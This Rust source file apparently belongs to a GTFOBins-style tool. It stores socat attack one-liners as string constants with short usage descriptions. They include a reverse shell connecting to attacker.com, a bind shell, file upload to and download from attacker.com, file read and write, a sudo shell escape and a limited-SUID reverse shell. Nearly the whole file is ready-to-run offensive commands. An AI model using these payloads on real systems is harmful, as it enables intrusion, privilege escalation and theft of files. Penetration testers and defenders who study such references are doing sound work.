pub static BIN_NAME: &'static str = "socat";
pub static SH_DESC: &'static str =
    "The resulting shell is not a proper TTY shell and lacks the prompt.";
pub static SH_CODE: &'static str = r#"
    
    socat stdin exec:/bin/sh
"#;
pub static RS_DESC: &'static str =
    "Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
"#;
pub static BS_DESC: &'static str = "Run `socat FILE:`tty`,raw,echo=0 TCP:target.com:12345` on the attacker box to connect to the shell.";
pub static BS_CODE: &'static str = r#"
    
    LPORT=12345
    socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
"#;
pub static FU_DESC: &'static str = "Run `socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat` on the attacker box to collect the file.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
"#;
pub static FD_DESC: &'static str = "Run `socat -u file:file_to_send tcp-listen:12345,reuseaddr` on the attacker box to send the file.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    socat -u 'exec:echo DATA' "open:$LFILE,creat"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    socat -u "file:$LFILE" -
"#;
pub static SUDO_DESC: &'static str =
    "The resulting shell is not a proper TTY shell and lacks the prompt.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo socat stdin exec:/bin/sh
"#;
pub static LSUID_DESC: &'static str =
    "Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which socat) .

    RHOST=attacker.com
    RPORT=12345
    ./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static BS: Code<'static> = Code {
    title: "BS_CODE",
    code: BS_CODE,
    tag: Tag::BS,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
